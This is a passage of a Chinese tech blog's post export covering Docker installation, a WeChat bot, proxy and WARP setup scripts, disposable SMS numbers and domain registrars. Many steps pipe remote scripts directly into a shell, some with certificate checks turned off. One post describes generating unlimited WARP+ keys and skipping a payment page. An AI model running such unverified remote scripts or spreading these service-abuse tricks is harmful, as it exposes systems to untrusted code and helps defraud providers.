<h1 id="使用-yum-安装（CentOS-7下）"><a href="#使用-yum-安装（CentOS-7下）" class="headerlink" title="使用 yum 安装（CentOS 7下）"></a>使用 yum 安装（CentOS 7下）</h1><p>Docker 要求 CentOS 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的CentOS 版本是否支持 Docker 。<br>通过 uname -r 命令查看你当前的内核版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -r 3.10.0-327.el7.x86_64</span><br></pre></td></tr></table></figure>
<h1 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h1><p>Docker 软件包和依赖包已经包含在默认的 CentOS-Extras 软件源里，安装命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install docker</span><br></pre></td></tr></table></figure>
<p>安装完成。</p>
<p>启动 Docker 后台服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
<p>测试运行 hello-world</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
<p>由于本地没有hello-world这个镜像，所以会下载一个hello-world的镜像，并在容器内运行。<br>使用脚本安装 Docker<br>1、使用 sudo 或 root 权限登录 Centos。<br>2、确保 yum 包更新到最新。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure>
<p>3、执行 Docker 安装脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>
<p>执行这个脚本会添加 docker.repo 源并安装 Docker。<br>4、启动 Docker 进程。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
<p>5、验证 docker 是否安装成功并在容器中执行一个测试的镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
<p>到此，docker 在 CentOS 系统的安装完成。</p>
<h1 id="查看-Docker-版本"><a href="#查看-Docker-版本" class="headerlink" title="查看 Docker 版本"></a>查看 Docker 版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>
<h1 id="开机自动启动"><a href="#开机自动启动" class="headerlink" title="开机自动启动"></a>开机自动启动</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker.service</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>os</category>
        <category>centos</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>os</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu/debian 安装 docker</title>
    <url>/posts/582e0af7/</url>
    <content><![CDATA[<h1 id="Docker-支持以下的-Ubuntu-版本："><a href="#Docker-支持以下的-Ubuntu-版本：" class="headerlink" title="Docker 支持以下的 Ubuntu 版本："></a>Docker 支持以下的 Ubuntu 版本：</h1><p>Ubuntu Precise 12.04 (LTS)<br>Ubuntu Trusty 14.04 (LTS)<br>Ubuntu Wily 15.10<br>其他更新的版本……<br>前提条件<br>Docker 要求 Ubuntu 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的 Ubuntu 版本是否支持 Docker。</p>
<h1 id="通过-uname-r-命令查看你当前的内核版本"><a href="#通过-uname-r-命令查看你当前的内核版本" class="headerlink" title="通过 uname -r 命令查看你当前的内核版本"></a>通过 uname -r 命令查看你当前的内核版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -r</span><br></pre></td></tr></table></figure>
<h1 id="使用脚本安装-Docker"><a href="#使用脚本安装-Docker" class="headerlink" title="使用脚本安装 Docker"></a>使用脚本安装 Docker</h1><h2 id="获取最新版本的-Docker-安装包"><a href="#获取最新版本的-Docker-安装包" class="headerlink" title="获取最新版本的 Docker 安装包"></a>获取最新版本的 Docker 安装包</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>
<p>输入当前用户的密码后，就会下载脚本并且安装Docker及依赖包。<br>安装完成后有个提示：<br>If you would like to use Docker as a non-root user, you should now consider<br>adding your user to the “docker” group with something like:<br>sudo usermod -aG docker localhost   Remember that you will have to log out and back in for this to take effect!<br>当要以非root用户可以直接运行docker时，需要执行 sudo usermod -aG docker localhost 命令，然后重新登陆，否则会有如下报错</p>
<h1 id="启动-Docker-后台服务"><a href="#启动-Docker-后台服务" class="headerlink" title="启动 Docker 后台服务"></a>启动 Docker 后台服务</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
<h1 id="查看-Docker-版本"><a href="#查看-Docker-版本" class="headerlink" title="查看 Docker 版本"></a>查看 Docker 版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>
<h1 id="开机自动启动"><a href="#开机自动启动" class="headerlink" title="开机自动启动"></a>开机自动启动</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker.service</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
        <category>os</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>os</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
      </tags>
  </entry>
  <entry>
    <title>最新 sillygirl 千寻框架微信机器人</title>
    <url>/posts/37eed428/</url>
    <content><![CDATA[<h1 id="项目GitHub"><a href="#项目GitHub" class="headerlink" title="项目GitHub"></a>项目GitHub</h1><p><a href="https://github.com/cdle/sillyGirl">https://github.com/cdle/sillyGirl</a></p>
<h1 id="各系统-sillyGirl-安装包"><a href="#各系统-sillyGirl-安装包" class="headerlink" title="各系统 sillyGirl 安装包"></a>各系统 sillyGirl 安装包</h1><p><a href="https://github.com/cdle/sillyGirl/releases">https://github.com/cdle/sillyGirl/releases</a></p>
<h1 id="开放8080端口"><a href="#开放8080端口" class="headerlink" title="开放8080端口"></a>开放8080端口</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br></pre></td></tr></table></figure>
<h1 id="重启防火墙"><a href="#重启防火墙" class="headerlink" title="重启防火墙"></a>重启防火墙</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<h1 id="傻妞安装升级脚本："><a href="#傻妞安装升级脚本：" class="headerlink" title="傻妞安装升级脚本："></a>傻妞安装升级脚本：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -sSL http://app.imdraw.com/install.sh)</span><br></pre></td></tr></table></figure>
<h1 id="转到安装位置进入交互模式"><a href="#转到安装位置进入交互模式" class="headerlink" title="转到安装位置进入交互模式"></a>转到安装位置进入交互模式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/sillyGirl &amp;&amp; ./sillyGirl -t</span><br></pre></td></tr></table></figure>
<h1 id="http-ip-8080"><a href="#http-ip-8080" class="headerlink" title="http://ip:8080"></a><a href="http://ip:8080/">http://ip:8080</a></h1><h1 id="启动http服务，一定要打开"><a href="#启动http服务，一定要打开" class="headerlink" title="启动http服务，一定要打开"></a>启动http服务，一定要打开</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> sillyGirl enable_http_server <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h1 id="插件管理——插件列表——千寻——配置（千寻端口例：7788）"><a href="#插件管理——插件列表——千寻——配置（千寻端口例：7788）" class="headerlink" title="插件管理——插件列表——千寻——配置（千寻端口例：7788）"></a>插件管理——插件列表——千寻——配置（千寻端口例：7788）</h1><h2 id="填写千寻服务器-http-ip-7788"><a href="#填写千寻服务器-http-ip-7788" class="headerlink" title="填写千寻服务器 http://ip:7788"></a>填写千寻服务器 <a href="http://ip:7788/">http://ip:7788</a></h2><h2 id="打开调试开关"><a href="#打开调试开关" class="headerlink" title="打开调试开关"></a>打开调试开关</h2><p><img src="/img/sillygirl/1.webp" alt="1"></p>
<h1 id="千寻服务器安装千寻微信框架"><a href="#千寻服务器安装千寻微信框架" class="headerlink" title="千寻服务器安装千寻微信框架"></a>千寻服务器安装千寻微信框架</h1><h2 id="微信管理——右键添加微信——随机端口——扫码登录微信小号"><a href="#微信管理——右键添加微信——随机端口——扫码登录微信小号" class="headerlink" title="微信管理——右键添加微信——随机端口——扫码登录微信小号"></a>微信管理——右键添加微信——随机端口——扫码登录微信小号</h2><p><img src="/img/sillygirl/2.webp" alt="2"></p>
<h2 id="框架设置——HTTP端口自定（例-7788，须到防火墙放行）——事件通知地址-http-傻妞ip-8080-bot-qianxun"><a href="#框架设置——HTTP端口自定（例-7788，须到防火墙放行）——事件通知地址-http-傻妞ip-8080-bot-qianxun" class="headerlink" title="框架设置——HTTP端口自定（例:7788，须到防火墙放行）——事件通知地址 http:&#x2F;&#x2F;傻妞ip:8080&#x2F;bot&#x2F;qianxun"></a>框架设置——HTTP端口自定（例:7788，须到防火墙放行）——事件通知地址 http:&#x2F;&#x2F;傻妞ip:8080&#x2F;bot&#x2F;qianxun</h2><p><img src="/img/sillygirl/3.webp" alt="3"></p>
<h1 id="与微信小号聊天输入myuid检验连接是否成功"><a href="#与微信小号聊天输入myuid检验连接是否成功" class="headerlink" title="与微信小号聊天输入myuid检验连接是否成功"></a>与微信小号聊天输入myuid检验连接是否成功</h1>]]></content>
      <categories>
        <category>tools</category>
        <category>sillygirl</category>
        <category>wechat</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>wechat</tag>
        <tag>sillygirl</tag>
      </tags>
  </entry>
  <entry>
    <title>八合一代理工具一键脚本 vless(reality)、vmess、trojan 和 hysteria</title>
    <url>/posts/69d788ef/</url>
    <content><![CDATA[<p>mack-a &#x2F; v2ray-agent<br>项目地址：<a href="https://github.com/mack-a/v2ray-agent">https://github.com/mack-a/v2ray-agent</a></p>
<h1 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h1><p><a href="https://www.v2ray-agent.com/archives/1682491479771">一键安装教程【推荐】</a><br>支持Xray-core&#x2F;v2ray-core内核<br>支持多种传输协议，VLESS（Reality）、VMess、Trojan和Hysteria，支持多种协议组合。<br>支持自动申请和更新证书<br>支持自主更换伪装站点<br><a href="https://www.v2ray-agent.com/archives/1684858575649">支持批量添加CDN节点并配合ClashMeta自动优选</a><br>支持订阅（Clash.Meta、v2rayNG、v2rayN、Shadowrocket等客户端）<br><a href="https://www.v2ray-agent.com/archives/ba-he-yi-jiao-ben-yu-ming-fen-liu-jiao-cheng">支持多种分流工具（Warp、IPv6、任意门、DNS、VMess(ws)、SNI反向代理）</a><br>支持批量新增端口<br>支持Core的升级以及回退<br><a href="https://www.v2ray-agent.com/archives/1680104902581">支持无域名版本的VLESS Reality搭建</a><br><a href="https://www.v2ray-agent.com/archives/1680104902581">Reality教程和介绍【推荐】</a><br><a href="https://www.v2ray-agent.com/archives/1680104902581">搭建最新的Vision和Reality防止VPS端口封禁</a></p>
<h1 id="下载脚本"><a href="#下载脚本" class="headerlink" title="下载脚本"></a>下载脚本</h1><p>支持快捷方式启动，安装完毕后，shell输入【vasma】即可打开脚本，脚本执行路径[&#x2F;etc&#x2F;v2ray-agent&#x2F;install.sh]</p>
<p>Github</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -P /root -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/mack-a/v2ray-agent/master/install.sh&quot;</span> &amp;&amp; <span class="built_in">chmod</span> 700 /root/install.sh &amp;&amp; /root/install.sh</span><br></pre></td></tr></table></figure>
<p>官方网站【备用】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -P /root -N --no-check-certificate <span class="string">&quot;https://www.v2ray-agent.com/v2ray-agent/install.sh&quot;</span> &amp;&amp; <span class="built_in">chmod</span> 700 /root/install.sh &amp;&amp; /root/install.sh</span><br></pre></td></tr></table></figure>

<h1 id="域名推荐"><a href="#域名推荐" class="headerlink" title="域名推荐"></a>域名推荐</h1><p>gateway.icloud.com<br>itunes.apple.com<br>download-installer.cdn.mozilla.net<br>airbnb【这个不同的区有不同的域名建议自己搜索】<br>addons.mozilla.org<br><a href="http://www.microsoft.com/">www.microsoft.com</a><br><a href="http://www.lovelive-anime.jp/">www.lovelive-anime.jp</a><br><a href="http://www.speedtest.net/">www.speedtest.net</a><br><a href="http://www.speedtest.org/">www.speedtest.org</a></p>
<h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><p>Apple:<br>swdist.apple.com<br>swcdn.apple.com<br>updates.cdn-apple.com<br>mensura.cdn-apple.com<br>osxapps.itunes.apple.com<br>aod.itunes.apple.com</p>
<p>Microsoft:<br>cdn-dynmedia-1.microsoft.com<br>update.microsoft<br>software.download.prss.microsoft.com</p>
<p>Amazon:<br>s0.awsstatic.com<br>d1.awsstatic.com<br>images-na.ssl-images-amazon.com<br>m.media-amazon.com<br>player.live-video.net</p>
<p>Google:<br>dl.google.com<br><a href="http://www.google-analytics.com/">www.google-analytics.com</a></p>
<h1 id="搭建教程"><a href="#搭建教程" class="headerlink" title="搭建教程"></a>搭建教程</h1><p><a href="https://www.v2ray-agent.com/archives/1682491479771">https://www.v2ray-agent.com/archives/1682491479771</a></p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>xray</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>xray</tag>
      </tags>
  </entry>
  <entry>
    <title>12个免费虚拟手机号平台：注册免烦恼，一键即可接码！</title>
    <url>/posts/5459fd5e/</url>
    <content><![CDATA[<p>1.<a href="https://freephonenum.com/">https://freephonenum.com</a></p>
<p>提供 10 个美国和 5 个加拿大的虚拟号码，可以接收和发送简讯，发送简讯每人每天仅限 5 条，无需注册，支持中文<br>2.<a href="https://quackr.io/">https://quackr.io</a></p>
<p>提供美国、英国、韩国、中国等 22 个国家和地区的虚拟手机号码，可以接收验证码或其他简讯，所有消息都会在 24 小时后自动删除，无需注册，不支持中文。<br>3.<a href="https://smsreceivefree.com/">https://smsreceivefree.com</a></p>
<p>提供美国和加拿大的虚拟电话，所有消息都会在 7 天后删除，无需注册，不支持中文。<br>4.<a href="https://smstome.com/">https://smstome.com</a></p>
<p>提供美国、加拿大、英国、法国、芬兰和瑞典的虚拟号码，所有消息都会在 2-3 天后删除，无需注册，不支持中文。<br>5.<a href="https://receive-smss.com/">https://receive-smss.com</a></p>
<p>提供美国、加拿大、英国和数个欧洲国家的虚拟号码，没有亚洲国家虚拟电话号码。接收简讯数量不限，所有消息都会在 24 小时内删除，无需注册，不支持中文。<br>6.<a href="https://temporary-phone-number.com/">https://temporary-phone-number.com</a></p>
<p>提供欧美、香港、日本、马来西亚等十几个国家地区的虚拟号码，无需注册，不支持中文。<br>7.<a href="https://temp-number.com/">https://temp-number.com</a></p>
<p>提供欧美各国的虚拟号码，所有消息只保留 7 天，无需注册，不支持中文。<br>8.<a href="https://www.receivesms.org/">https://www.receivesms.org</a></p>
<p>只有美国、加拿大、瑞典和英国的少量号码供用户选择，无需注册，不支持中文。<br>9.<a href="https://receive-sms-free.cc/">https://receive-sms-free.cc</a></p>
<p>提供美国、英国、法国等地的大量虚拟手机号，无需注册，不支持中文<br>10.<a href="https://jiemahao.com/">https://jiemahao.com</a></p>
<p>提供美国、英国、泰国、香港等地的虚拟号码，所有简讯记录在 7 天后删除，无需注册，支持中文。<br>11.<a href="https://oksms.org/">https://oksms.org</a></p>
<p>提供大量的英国、加拿大和美国虚拟号码，无需注册，不支持中文。<br>12.<a href="https://sms24.me/">https://sms24.me</a></p>
<p>提供欧美各国和亚洲等地的虚拟电话，无需注册，不支持中文。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>sms</category>
      </categories>
      <tags>
        <tag>sms</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>免费和付费域名网站分享 free and paid domains</title>
    <url>/posts/3414826d/</url>
    <content><![CDATA[<h1 id="免费域名网站"><a href="#免费域名网站" class="headerlink" title="免费域名网站"></a>免费域名网站</h1><p>1.EU.org域名，永久免费！【<a href="https://nic.eu.org/">注册链接</a>】</p>
<p>2.Onamae，顶级域名首年免费，支持com&#x2F;net域名 【<a href="https://www.onamae.com/">注册链接</a>】</p>
<p>3.商用域名、提供永久免费的Whois 隐私保护！ 推荐 Namesio 【<a href="https://www.namesilo.com/?rid=5373852pq">优惠链接</a>】，新用户首次注册优惠1刀，优惠码：wht1off</p>
<p>4.dynadot<br><a href="https://www.dynadot.com/">https://www.dynadot.com/</a></p>
<p>5.noip</p>
<p><a href="https://www.noip.com/">https://www.noip.com/</a></p>
<p>Cloudflare 名称服务器<br>要使用 Cloudflare，请确保已更改权威 DNS 服务器或名称服务器。这些服务器是分配的 Cloudflare 名称服务器。建议自己去免费注册 【<a href="https://dash.cloudflare.com/sign-up">注册链接</a>】</p>
<table>
<thead>
<tr>
<th><center>NS</center></th>
<th><center>grannbo.ns.cloudflare.com</center></th>
</tr>
</thead>
<tbody><tr>
<td><center>NS</center></td>
<td><center>sid.ns.cloudflare.com</center></td>
</tr>
</tbody></table>
<h1 id="收费域名网站"><a href="#收费域名网站" class="headerlink" title="收费域名网站"></a>收费域名网站</h1><p>1.<a href="https://www.spaceship.com/">太空船</a> （最便宜，要paypal或者外国信用卡）</p>
<p>2.<a href="https://www.namesilo.com/">namesilo</a> （比较便宜，可以用支付宝）</p>
<p>3.<a href="https://www.namecheap.com/">Namecheap</a></p>
<h1 id="域名比价网站"><a href="#域名比价网站" class="headerlink" title="域名比价网站"></a>域名比价网站</h1><p>1.<a href="https://tld-list.com/">Compare Prices of All Top-Level Domains | TLD-List</a></p>
<p>2.<a href="https://www.nazhumi.com/">哪煮米 - 全网域名,一站比价 (nazhumi.com)</a></p>
]]></content>
      <categories>
        <category>web</category>
        <category>domain</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>domain</tag>
      </tags>
  </entry>
  <entry>
    <title>xui 第三方修改版：x-ui-yg 甬哥版，甲骨文vps也可以访问chatgpt</title>
    <url>/posts/f547d07a/</url>
    <content><![CDATA[<p>项目地址 <a href="https://github.com/yonggekkk/x-ui-yg">https://github.com/yonggekkk/x-ui-yg</a><br>视频教程 <a href="https://www.youtube.com/watch?v=xlvKnjQoF7c&ab_channel=%E7%94%AC%E5%93%A5%E4%BE%83%E4%BE%83%E4%BE%83">https://www.youtube.com/watch?v=xlvKnjQoF7c&amp;ab_channel=%E7%94%AC%E5%93%A5%E4%BE%83%E4%BE%83%E4%BE%83</a></p>
<p>x-ui第三方修改版：x-ui-yg甬哥版。主要是给个人用的，个人！！<br>近可能与原版vaxilu相近，减少操作步骤，加入最新的reality方案，具体看下面视频教程吧<br>视频教程：<br>x-ui搭建reality协议并配置TCP、H2、GRPC节点教程，已集成warp解锁ChatGPT功能，x-ui数据重置、备份、恢复详细操作，电脑&#x2F;苹果&#x2F;安卓&#x2F;路由器平台上配置reality节点</p>
<p>一键脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(wget -qO- https://gitlab.com/rwkgyg/x-ui-yg/raw/main/install.sh 2&gt; /dev/null)</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -Ls https://gitlab.com/rwkgyg/x-ui-yg/raw/main/install.sh)</span><br></pre></td></tr></table></figure>

<p>相关说明<br>0、目前更新加入上游XUI面版上传备份恢复功能，不用进SSH恢复备份啦！！<br>1、目前新安装的XUI，随便设置个节点就能登录ChatGPT，无须安装WARP脚本或者设置分流，因为已经给小白朋友们设置好了xray-warp出站ChatGPT！其中xray-warp的相关节点信息，大家可以替换成自己的，具体看之前的warp视频教程<br>2、目前默认规则就是ChatGPT与ip.sb这两个网站走xray-warp出站，大家可以用ip.sb这个网站查看，其他都走VPS原始IP线路，当然如果你另外装WARP脚本，那就另当别论了<br>3、如果登录chatgpt时出现官网界面停滞，聊天界面转圈，这八成说明当前xray-warp出站的WARP IP被使用过多，建议使用浏览器无痕模式、重启XUI、更换VPS国家来解决<br>4、视频中所说的默认屏蔽中国IP域名功能，现在已删除，因为老有人问我全局怎么打不开中国的网站。囧！目前代理可直连中国IP域名！<br>5、有人说安卓nekobox客户端要钱？那是因为你在google商店下载。。官方说了，如果你在github下载，免费哦！<a href="https://github.com/MatsuriDayo/NekoBoxForAndroid/tags">NekoBox下载</a><br>6、视频中申请证书是用在tls这个节点的（xtls-vision模式），而reality三个模式（TCP、H2、GRPC）无须申请证书。TCP建议开启flow流控设置，H2与GRPC必须关闭flow流控设置，平时切记无需开启CDN黄云，因为都不支持CDN<br>7、视频中图片推荐IOS客户端可以使用免费客户端Wings X，现在已更名为FoXray<br>8、关于MAC客户端：xray官方推荐 V2RayXS 与 FoXray<br>9、关于reality服务端域名设置，当前默认域名已从甲骨文的官网更改为微软官网：<a href="http://www.microsoft.com/">www.microsoft.com</a><br>官方定义reality域名的目标网站最低标准：国外网站 、支持 TLSv1.3 、X25519 与 H2<br>在网上随便找了些：<br>gateway.icloud.com<br>itunes.apple.com<br>download-installer.cdn.mozilla.net<br>addons.mozilla.org<br><a href="http://www.microsoft.com/">www.microsoft.com</a><br><a href="http://www.lovelive-anime.jp/">www.lovelive-anime.jp</a><br>swdist.apple.com<br>swcdn.apple.com<br>updates.cdn-apple.com<br>mensura.cdn-apple.com<br>osxapps.itunes.apple.com<br>aod.itunes.apple.com<br>cdn-dynmedia-1.microsoft.com<br>update.microsoft<br>software.download.prss.microsoft.com<br>s0.awsstatic.com<br>d1.awsstatic.com<br>images-na.ssl-images-amazon.com<br>m.media-amazon.com<br>player.live-video.net<br>dl.google.com<br><a href="http://www.yahoo.com/">www.yahoo.com</a></p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>xray</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>xray</tag>
      </tags>
  </entry>
  <entry>
    <title>tuic协议一键脚本搭建教程(更新V5版本)，最新udp协议</title>
    <url>/posts/92c96601/</url>
    <content><![CDATA[<p>TUIC协议也走udp，但行为比Hysteria协议要温柔，如果你当地网络营运商没有大规模限制UDP，那TUIC也是一个不错的选择，多一个协议如同多一个选择，分散被失联的机率，大家可以备用尝试哦。<br><a href="https://github.com/yonggekkk/Tuic-yg">TUIC项目脚本地址</a><br>本期TUIC视频：<a href="https://youtu.be/FOh1ClXhb_w">全网首发：TUIC协议一键脚本搭建教程，前有暴力的Hysteria，后有温柔的TUIC，小白们无脑享受UDP协议。电脑V2rayN、安卓Sagernet、苹果小火箭Shadowrocket最全面教程</a><br>甬哥的naiveproxy脚本，hysteria脚本，x-ui脚本都可以共存，当然共用的证书建议都用甬哥的acme脚本来串连，这样小白无压力<br>视频教程中相关链接：<br><a href="https://github.com/2dust/v2rayN/releases">V2rayN官方下载</a><br><a href="https://github.com/EAimTY/tuic/releases/tag/tuic-client-1.0.0">V2rayN客户端所需TUIC官方核心下载 </a><br>V5核心请下载目前最新的tuic-client-1.0.0中的tuic-client-1.0.0-x86_64-pc-windows-msvc.exe，并重命名为tuic-client.exe，覆盖V2rayN目录下\bin\tuic文件夹里的内容<br><a href="https://github.com/MatsuriDayo/NekoBoxForAndroid/releases">安卓nekobox客户端</a><br><a href="https://github.com/MatsuriDayo/plugins/releases">安卓TUIC插件下载</a><br>视频教程中相关补充说明：<br>1：由于该协议功能比较直接，在代理方面目前没什么特殊玩法（或许没发现），目前脚本为最基础功能<br>2：相比原来V4老版六项主要参数设置，V5就多了一项UUID设置，老版与新版并不兼容<br>3：目前openwrt好像没一个支持TUIC的？遗憾</p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>tuic</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>tuic</tag>
      </tags>
  </entry>
  <entry>
    <title>无限注册warp账户无限流量，replit生成wireguard隧道信息</title>
    <url>/posts/68d91ed8/</url>
    <content><![CDATA[<h1 id="WARP客户端："><a href="#WARP客户端：" class="headerlink" title="WARP客户端："></a>WARP客户端：</h1><p><a href="https://1.1.1.1/">https://1.1.1.1/</a></p>
<h1 id="WARP多功能VPS一键脚本，支持纯IPV4、纯IPV6的VPS直接安装，主流linux系统均支持"><a href="#WARP多功能VPS一键脚本，支持纯IPV4、纯IPV6的VPS直接安装，主流linux系统均支持" class="headerlink" title="WARP多功能VPS一键脚本，支持纯IPV4、纯IPV6的VPS直接安装，主流linux系统均支持"></a>WARP多功能VPS一键脚本，支持纯IPV4、纯IPV6的VPS直接安装，主流linux系统均支持</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(wget -qO- https://gitlab.com/rwkgyg/CFwarp/raw/main/CFwarp.sh 2&gt; /dev/null)</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -Ls https://gitlab.com/rwkgyg/CFwarp/raw/main/CFwarp.sh)</span><br></pre></td></tr></table></figure>
<p>强制终止：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">warp-go：<span class="built_in">kill</span> -15 $(pgrep warp-go) </span><br></pre></td></tr></table></figure>
<p>终止wgcf：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop wg-quick@wgcf</span><br></pre></td></tr></table></figure>
<h1 id="多平台优选WARP对端IP-无限生成WARP-Wireguard配置-一键脚本"><a href="#多平台优选WARP对端IP-无限生成WARP-Wireguard配置-一键脚本" class="headerlink" title="多平台优选WARP对端IP + 无限生成WARP-Wireguard配置 一键脚本"></a>多平台优选WARP对端IP + 无限生成WARP-Wireguard配置 一键脚本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sSL https://gitlab.com/rwkgyg/CFwarp/raw/main/point/endip.sh -o endip.sh &amp;&amp; <span class="built_in">chmod</span> +x endip.sh &amp;&amp; ./endip.sh</span><br></pre></td></tr></table></figure>
<h1 id="Replit平台一键无限生成WARP-Wireguard配置："><a href="#Replit平台一键无限生成WARP-Wireguard配置：" class="headerlink" title="Replit平台一键无限生成WARP-Wireguard配置："></a>Replit平台一键无限生成WARP-Wireguard配置：</h1><p><a href="https://replit.com/@ygkkkk/WARP-Wireguard-Register">https://replit.com/@ygkkkk/WARP-Wireguard-Register</a></p>
<h1 id="Wireguard客户端："><a href="#Wireguard客户端：" class="headerlink" title="Wireguard客户端："></a>Wireguard客户端：</h1><p><a href="https://www.wireguard.com/install/">https://www.wireguard.com/install/</a></p>
<h1 id="Replit平台一键无限生成WARP-密钥（2000多万GB流量）："><a href="#Replit平台一键无限生成WARP-密钥（2000多万GB流量）：" class="headerlink" title="Replit平台一键无限生成WARP+密钥（2000多万GB流量）："></a>Replit平台一键无限生成WARP+密钥（2000多万GB流量）：</h1><p><a href="https://replit.com/@ygkkkk/WarpKey-Register-PRO">https://replit.com/@ygkkkk/WarpKey-Register-PRO</a></p>
<h1 id="获取WARP-密钥的TG机器人，免刷流量，直接送2300万GB流量"><a href="#获取WARP-密钥的TG机器人，免刷流量，直接送2300万GB流量" class="headerlink" title="获取WARP+密钥的TG机器人，免刷流量，直接送2300万GB流量"></a>获取WARP+密钥的TG机器人，免刷流量，直接送2300万GB流量</h1><p><a href="https://t.me/generatewarpplusbot">https://t.me/generatewarpplusbot</a></p>
<h1 id="测试网站："><a href="#测试网站：" class="headerlink" title="测试网站："></a>测试网站：</h1><p><a href="https://www.cloudflare.com/cdn-cgi/trace">https://www.cloudflare.com/cdn-cgi/trace</a> （warp&#x3D;on，warp&#x3D;plus）</p>
<h1 id="更多ygkkk-甬哥侃侃侃基于Replit平台的项目："><a href="#更多ygkkk-甬哥侃侃侃基于Replit平台的项目：" class="headerlink" title="更多ygkkk 甬哥侃侃侃基于Replit平台的项目："></a>更多ygkkk 甬哥侃侃侃基于Replit平台的项目：</h1><p><a href="https://replit.com/@ygkkkk?tab=repls">https://replit.com/@ygkkkk?tab=repls</a></p>
<h1 id="WARP-Team团队账户注册方法："><a href="#WARP-Team团队账户注册方法：" class="headerlink" title="WARP Team团队账户注册方法："></a>WARP Team团队账户注册方法：</h1><ol>
<li>Cloudfare</li>
<li>Zero Trust</li>
<li>创建团队名称</li>
<li>购买free套餐，退出重进绕过支付页面</li>
<li>Settings——My Team——Device</li>
<li>connect your first device @gmail 收验证码</li>
<li>终端会显示这个网址获取Team Token：<br><a href="https://web--public--warp-team-api--coia-mfs4.code.run/">https://web--public--warp-team-api--coia-mfs4.code.run/</a></li>
</ol>
]]></content>
      <categories>
        <category>proxy</category>
        <category>warp</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>warp</tag>
      </tags>
  </entry>
  <entry>
    <title>racknerd 套餐整理，年付10美元自建代理服务器</title>
    <url>/posts/f7d5455c/</url>
